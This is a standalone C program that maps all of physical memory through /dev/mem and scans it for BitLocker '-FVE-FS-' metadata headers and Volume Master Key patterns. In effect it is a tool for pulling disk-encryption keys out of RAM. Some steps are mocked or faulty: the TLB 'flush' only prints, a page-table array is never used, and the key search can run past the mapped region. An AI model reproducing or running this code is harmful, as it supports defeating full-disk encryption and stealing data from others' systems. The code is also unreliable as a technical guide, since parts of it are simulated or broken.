#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

// Constants
#define PAGE_SIZE 0x1000ULL // 4KB page size
#define CHUNK_SIZE 0x200000ULL // 2MB per chunk
#define HEADER_SIGNATURE "-FVE-FS-" // Header to search for
#define VMK_PATTERN "\x03\x20\x01\x00" // VMK pattern to search for
#define VMK_PATTERN_LEN 4 // Length of the VMK pattern

// Function to fetch physical memory size from /proc/meminfo
unsigned long long get_physical_memory_size() {
    FILE *fp = fopen("/proc/meminfo", "r");
    if (!fp) {
        perror("fopen");
        exit(1);
    }

    unsigned long long mem_total = 0;
    char line[256];

    // Look for MemTotal in /proc/meminfo
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "MemTotal:", 9) == 0) {
            sscanf(line, "MemTotal: %llu kB", &mem_total);
            mem_total *= 1024;  // Convert from kB to bytes
            break;
        }
    }
    
    fclose(fp);
    return mem_total;
}

// Mock function for TLB flushing (could be platform-specific)
void flush_tlb(unsigned long long *area, size_t size) {
    // In a real-world scenario, this would trigger an actual TLB flush
    // On Linux, this might require specific syscalls or be managed by the kernel
    printf("[*] Flushing TLB for memory area: %p, size: %zu bytes.\n", area, size);
}

// Memory search function (similar to memmem)
void* search_memory(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
    for (size_t i = 0; i <= haystack_size - needle_size; ++i) {
        if (memcmp((const char *)haystack + i, needle, needle_size) == 0) {
            return (void *)((char *)haystack + i);
        }
    }
    return NULL;
}

int main() {
    // Step 1: Dynamically fetch the physical memory size
    unsigned long long physical_mem_size = get_physical_memory_size();
    printf("[+] Detected physical memory size: %llu bytes\n", physical_mem_size);

    // Step 2: Open /dev/mem to access physical memory (may need root privileges)
    int mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd == -1) {
        perror("Failed to open /dev/mem");
        exit(1);
    }

    // Step 3: Iterate through chunks of memory based on the detected size
    for (unsigned long long i = 0; i < (physical_mem_size / CHUNK_SIZE); i++) {
        unsigned long long chunk_base = i * CHUNK_SIZE;

        // Step 4: Map the current chunk of physical memory into the process's address space
        void *mapped_chunk = mmap(NULL, CHUNK_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, chunk_base);
        if (mapped_chunk == MAP_FAILED) {
            perror("mmap");
            continue;  // Skip this chunk if mmap fails
        }

        // Step 5: Setup 512 Page Table Entries (PTEs) - simulate PTE setup (not needed in userspace)
        unsigned long long page_table[512]; // Example of page table array (simplified)
        for (unsigned short j = 0; j < 512; j++) {
            page_table[j] = chunk_base + j * PAGE_SIZE;
        }

        // Step 6: Flush TLB (this may need to be adapted for the system)
        flush_tlb(page_table, sizeof(page_table));

        // Step 7: Search for the header signature in the memory area
        void *header_addr = search_memory(mapped_chunk, CHUNK_SIZE, HEADER_SIGNATURE, strlen(HEADER_SIGNATURE));
        if (header_addr == NULL) {
            munmap(mapped_chunk, CHUNK_SIZE);  // Unmap the memory after use
            continue;  // Skip if header not found
        }

        printf("[+] Found header at address: %p\n", header_addr);

        // Step 8: Extract version, start, and end from the header
        uint32_t version = *(uint32_t *)(header_addr + 8 + 4);
        uint32_t start = *(uint32_t *)(header_addr + 8 + 4 + 4);
        uint32_t end = *(uint32_t *)(header_addr + 8 + 4 + 4 + 4);

        // Validate version and size
        if (version != 1 || end <= start) {
            printf("[!] Invalid version or size. Skipping...\n");
            munmap(mapped_chunk, CHUNK_SIZE);  // Unmap the memory after use
            continue;
        }

        // Step 9: Search for the VMK pattern in the data following the header
        void *vmk_addr = search_memory(header_addr, end, VMK_PATTERN, VMK_PATTERN_LEN);
        if (vmk_addr == NULL) {
            printf("[!] VMK pattern not found.\n");
            munmap(mapped_chunk, CHUNK_SIZE);  // Unmap the memory after use
            continue;
        }

        printf("[+] Found VMK pattern at address: %p\n", vmk_addr);

        // Unmap the memory after processing
        munmap(mapped_chunk, CHUNK_SIZE);
    }

    // Close /dev/mem after use
    close(mem_fd);
    return 0;
}
